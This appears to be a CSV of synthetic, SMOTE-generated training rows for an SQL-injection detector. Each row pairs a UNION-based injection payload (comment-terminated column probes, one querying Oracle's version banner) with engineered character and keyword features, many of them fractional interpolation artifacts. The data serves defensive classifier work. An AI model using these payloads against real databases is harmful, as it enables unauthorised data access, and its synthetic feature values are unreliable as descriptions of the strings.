id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000206,0.1989743864400784,69.48406222702594,21.0,3.6665251131089764,14.0,29.187249781620757,14.0,12.29681244540519,0.2016968430341734,0.4196573817069873,0.2016968430341734,0.1769489322246659,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.0,1.0,0.0,5.296812445405189,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000143,1.072973275580188,97.37773814605212,26.688869073026062,4.038245000142097,25.622261853947872,44.0,14.444345365130319,13.311130926973936,0.2632374795956195,0.451889830099246,0.1481188388016515,0.13675385150348301,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.6888690730260638,0.0,1.0,0.0,0.0,7.622261853947872,3.688869073026064,1.0,0.0,1.0,0.0,0.0,0.6888690730260638,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.6888690730260638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.688869073026064
SMOTE_000003,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000155,0.3099904426637172,96.44515528241017,29.12225776412051,4.046534633112784,25.0,37.956124225928136,22.0,11.489031056482034,0.2602529971948251,0.39192330039851425,0.22902263753144608,0.11880106487521458,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,5.489031056482035,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000234,0.2793624131972355,72.57197859569695,29.31439571913939,4.257987319808471,29.0,21.25758287655756,15.0,7.31439571913939,0.40000233890377845,0.2924108251152053,0.20689776150195435,0.10068907447906189,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.31439571913939,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000005,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000129,0.07640100307882439,50.69706931739498,20.121172273042006,3.9629832289373117,14.0,23.757655453915984,4.0,8.939413863478997,0.2763175744059976,0.46841891071280295,0.07894787840171358,0.17631563647948595,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.939413863478996,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000098,0.5974249943846973,105.87923035508494,25.67673080374292,3.9128578968147654,25.0,49.29307678502831,17.93961517754247,13.646538392514158,0.23675776067448195,0.4659176793110432,0.16853913505572524,0.12878542495874953,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.3232691962570784,0.0,0.0,8.32326919625708,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.27080057416801845,67.89843751526998,19.789843751527,3.5402525608993303,14.0,38.31875001221598,4.0,11.579687503053995,0.20700520828243343,0.5634226191057903,0.059144345223552414,0.1704278273882238,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,7.579687503053995,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000199,1.06303294417206,106.98350323820173,28.274226978345297,4.080812196399322,60.224736692950515,15.30722050194182,17.0,14.451546043309406,0.5577464933690208,0.14802045234800593,0.15925440265845459,0.1349786516245187,3.0,0.0,0.2742269783452964,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.177319064964111,3.2742269783452964,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000009,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,1.3411440080409838,100.79853772271849,26.0,4.048531472206913,63.79853772271849,4.550365569320377,24.0,8.449634430679623,0.6327886531078342,0.04525777216329557,0.23819114393005356,0.08376243079881679,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.449634430679624,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.44963443067962394,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000010,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,0.6601204121333646,91.77288150450966,27.314406792042472,3.8557755174305424,25.0,37.25762716816989,17.88644075225483,11.628813584084943,0.27337249572582484,0.40623266552688664,0.1938228047870762,0.12657203396021235,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.3144067920424718,0.0,0.0,5.314406792042472,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
